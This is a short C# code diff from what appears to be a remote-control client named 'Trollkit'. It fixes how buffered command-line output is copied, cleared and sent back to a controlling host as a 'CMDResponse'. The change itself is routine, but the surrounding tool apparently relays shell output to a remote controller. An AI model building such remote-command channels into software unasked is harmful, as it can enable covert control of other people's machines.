@@ -101,10 +101,10 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			if (CMDLineBuffer.Count != 0)
 			{
 				string appendedLines = "";
-
-				foreach (string line in CMDLineBuffer)
-					appendedLines += line + "\r\n";
+				List<string> data = new List<string>(CMDLineBuffer);
 				CMDLineBuffer.Clear();
+				foreach (string line in data)
+					appendedLines += line + "\r\n";				
 
 				//write buffer to host
 				TransferCommandObject responseCMDTransferObject = new TransferCommandObject { Command = "CMDResponse", Value = appendedLines };
